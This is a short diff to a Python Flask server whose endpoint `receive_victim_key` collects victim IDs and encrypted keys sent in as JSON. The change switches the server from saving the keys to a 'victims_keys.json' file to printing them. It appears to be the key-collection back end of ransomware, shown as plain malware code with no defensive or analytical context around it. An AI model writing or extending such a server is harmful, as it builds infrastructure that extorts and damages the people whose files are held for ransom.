@@ -9,10 +9,10 @@ app = Flask(__name__)
 def receive_victim_key():
     data = request.json
     
-    # open file and append the data
-    file = open('victims_keys.json', 'a')
-    file.write(json.dumps(data) + '\n')
-    file.close()
+    # print to console
+    print(f"Victim ID: {data.get('victim_id', 'UNKNOWN')}")
+    print(f"Encrypted Key (first 50 chars): {data.get('encrypted_key', 'NONE')[:50]}...")
+    print(f"JSON payload: {json.dumps(data)}\n")
     
     print("Got a key from victim:", data['victim_id'])
     
